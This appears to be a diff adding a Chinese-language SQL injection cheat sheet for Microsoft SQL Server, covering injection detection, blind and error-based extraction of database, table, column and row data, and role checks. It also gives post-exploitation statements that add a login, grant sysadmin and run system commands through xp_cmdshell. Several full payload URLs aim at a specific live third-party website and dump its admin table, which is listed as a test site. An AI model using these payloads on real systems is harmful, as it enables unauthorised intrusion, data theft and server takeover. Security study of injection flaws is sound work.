@@ -1,0 +1,123 @@
+mssql基础语句：
+select * from 表名
+create database 数据库名
+drop dataabse 数据库名
+
+
+mssql数据库权限：
+sa权限：数据库操作、文件管理、命令执行、注册表读取等system
+db权限：文件管理、数据库操作users-administrators
+publi权限：数据库操作 (来宾用户guest-users)
+
+拿shell的方法：
+差异备份拿shell
+完全备份拿shell
+
+搭配的脚本语言：
+asp、aspx
+
+调用代码：
+一般写在web.config里面 https://www.cnblogs.com/zhoading/p/8601637.html
+
+连接代码一般如下（web.config里面）
+   <connectionStrings>
+    <remove name="LocalSqlServer" />
+    <add name="SqlConnStr" connectionString="user id=xx;password=xx;initial catalog=database_name;data source=.\sqlxxxx" />
+  </connectionStrings>
+  
+  
+ asp代码一般这样写：
+<%
+MM_conn_STRING = "Driver={SQLServer};server=(local);uid=sa;pwd=;database=infs;"
+Set conn = Server.Createobject("ADODB.Connection")
+conn.open MM_conn_STRING
+%>
+
+注入语句(基础)：
+and 1=1
+and 1=2
+判断注入的方法是一样的
+初步判断是否有mssql
+and user>0
+判断数据库系统
+and (select count(*) from sysobjects) #mssql数据库 返回正常
+and (select count(*) from msysobjects) #access数据库 返回正常
+
+tips:不推荐用手工，推荐用工具，工具会帮你判断好。当sqlmap那些碰到狗了可以手动bypass，或者写tamger脚本（bypass WAF），语句没必要死记硬背。
+
+猜数据库名
+and ascii(substring((select top 1 name from master.dbo.sysdatabases),1,1))>=109
+猜表名
+and (select count(*) from [表名])>0
+猜字段
+and (select count(字段名) from 表名)>0
+猜字段中记录长度
+and (select top 1 len(字段名) from 表名)>0
+猜字段中的ascii值（access）
+and (select top 1 asc(mid(字段名,1,1)) from 表名)>0
+猜字段的ascii值（mssql）
+and (select top 1 unicode(substring(字段名,1,1)) from 表名)>0
+判断权限
+and 1=(select IS_SRVROLEMEMBER('sysadmin'))
+and 1=(select IS_SRVROLEMEMBER('serveradmin'))
+and 1=(select IS_SRVROLEMEMBER('setupadmin'))
+and 1=(select IS_SRVROLEMEMBER('securityadmin'))
+and 1=(select IS_SRVROLEMEMBER('diskadmin'))
+and 1=(select IS_SRVROLEMEMBER('bulkadmin'))
+and 1=(select IS_SRVROLEMEMBER('db_owner'))
+
+猜数据库版本
+and substring((select @@version)22,4)='2005'
+
+（有回显的方式）
+直接爆数据库版本
+and 1=(select @@version)
+爆数据库名
+and 1=(select db_name())
+
+爆其他数据库名：
+and 1=(select top 1 name from master..sysdatabases where dbid>4)
+and 1=(select top 1 name from master..sysdatabases where dbid>4 and name <> [第一个数据库名]) 例如：http://www.0577yy.com/service.aspx?sid=615&t=34&id=34 and 1=(select top 1 name from master..sysdatabases where dbid>4 and name <>  '0577ccc_com')，如果还要查询下一个的话则以此类推，例如
+and 1=(select top 1 name from master..sysdatabases where dbid>4 and name <> '0577ccc_com' and name <> '0577wztc_com')
+
+爆所有表名
+and 1=(select quotename(name) from 数据库名..sysobjects where xtype='U' FOR XML PATH(''))--
+http://www.0577yy.com/service.aspx?sid=615&t=34&id=34%20and%201=(select%20quotename(name)%20from%20www_0577yy_com..sysobjects%20where%20xtype=%27U%27%20FOR%20XML%20PATH(%27%27))--
+
+爆第一个表名
+and 1=(select top 1 name from sysobjects where xtype='u')
+爆第二个表名
+and 1=(select top 1 name from sysobjects where xtype='u' and name <> 'D99_Tmp') #D99_Tmp为第一个表名，意思为不非这个表名，从而实现获取下一个表名的效果
+http://www.0577yy.com/service.aspx?sid=615&t=34&id=34 and 1=(select top 1 name from sysobjects where xtype='u' and name <> 'D99_Tmp')
+爆第三个表名以此类推
+and 1=(select top 1 name from sysobjects where xtype='u' and name <> 'D99_Tmp' and name <> '第二个表名')
+爆列名
+and 1=(select top 1 name from syscolumns where id=(select id from sysobjects where name='表名'))
+http://www.0577yy.com/service.aspx?sid=615&t=34&id=34 and 1=(select top 1 name from syscolumns where id=(select id from sysobjects where name='FzAdmin'))
+爆第二个列名
+and 1=(select top 1 name from syscolumns where id=(select id from sysobjects where name='表名')and name <> '第一个列名')
+http://www.0577yy.com/service.aspx?sid=615&t=34&id=34%20and%201=(select%20top%201%20name%20from%20syscolumns%20where%20id=(select%20id%20from%20sysobjects%20where%20name=%27FzAdmin%27)and%20name%20%3C%3E%20%27id%27)
+查数据
+and 1=(select top 1 <列名> from <表名>)
+爆指定表里的所有列内容
+and 1=(select top 1 * from 指定数据库..指定表名  FOR XML PATH(''))
+http://www.0577yy.com/service.aspx?sid=615&t=34&id=34%20and%201=(select%20top%201%20*%20from%20www_0577yy_com..FzAdmin%20FOR%20XML%20PATH(%27%27))
+
+mssql一些可利用的语句：
+exec master..dbo.sp_addlogin <username> #添加登录用户
+exec master..dbo.sp_password null,<username>,<password> #给用户添加密码
+exec master..dbo.sp_addsrvrolemember sysadmin,<username> #基于用户sa权限
+exec master..dbo.xp_cmdshell 'command' #执行系统命令
+
+参考链接：https://blog.csdn.net/wyaspnet/article/details/5587357
+
+提示：
+sql server 2005之前或2005可以执行命令和列目录，而2005之后的不行，要自己恢复组件才行
+如果xp_cmdshell执行不了命令或者恢复不了可以恢复SP_OA
+
+注入推荐工具：
+穿山甲、sqlmap、超级SQL注入工具
+
+测试站点：
+http://www.vulnweb.com/index.html
+http://www.0577yy.com/service.aspx?sid=615&t=34&id=34
